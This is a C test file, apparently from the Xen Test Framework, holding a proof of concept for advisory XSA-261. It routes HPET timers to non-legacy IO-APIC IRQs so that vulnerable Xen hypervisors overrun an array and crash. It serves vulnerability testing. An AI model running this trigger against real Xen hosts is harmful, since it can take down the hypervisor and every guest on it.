/**
 * @file tests/xsa-261/main.c
 * @ref test-xsa-261
 *
 * @page test-xsa-261 XSA-261
 *
 * Advisory: [XSA-261](https://xenbits.xen.org/xsa/advisory-261.html)
 *
 * Before XSA-261, Xen didn't implement IO-APIC interrupt routing for HPET
 * timers properly, and attempting to configure a IRQ above the legacy PIC
 * range resulted in an array overrun.
 *
 * This test attempts to configure the non-legacy IRQs for each timer.  If
 * vulnerable, Xen will generally crash on the first IRQ attempt, but this
 * does depend on the exact compiled layout of `struct domain`.  If Xen hasn't
 * crashed by the end of the loops, it is most likely not vulnerable.
 *
 * @see tests/xsa-261/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-261 PoC";

void test_main(void)
{
    unsigned int timer, irq;

    if ( hpet_init() || !hpet_nr_timers )
        return xtf_skip("Skip: No working HPET\n");

    if ( ioapic_init() )
        return xtf_skip("Skip: No working IO-APIC\n");

    /*
     * Attempt to test all timers using non-ISA IRQs, regardless of whether
     * the timer supports them or not.
     */
    for ( timer = 0; timer < hpet_nr_timers; timer++ )
    {
        for ( irq = 16; irq < 32; irq++ )
        {
            if ( ioapic_set_mask(irq, false) )
                return xtf_error("Error: cannot unmask IRQ %u on the IO APIC\n",
                                 irq);

            hpet_init_timer(timer, irq, 1, false, false, false);

            while ( hpet_read_counter() < 1 );
        }
    }

    /* Xen still hasn't crashed?  Most likely not vulnerable. */
    xtf_success("Success: Probably not vulnerable to XSA-261\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
